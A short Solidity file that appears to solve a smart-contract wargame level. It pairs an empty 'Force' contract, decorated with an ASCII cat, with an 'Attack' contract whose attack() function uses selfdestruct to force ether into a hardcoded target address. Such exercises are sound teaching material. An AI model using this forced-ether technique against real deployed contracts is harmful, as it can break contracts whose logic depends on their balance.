// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack {
    //change the address
    Force f = Force(0xda9D530915cF1707F57554deA7d90b8d31d388Df);
    constructor() public {
        
    }
    function attack () public payable{
        address payable addr = payable(address(f));
        selfdestruct(addr);
    }
}
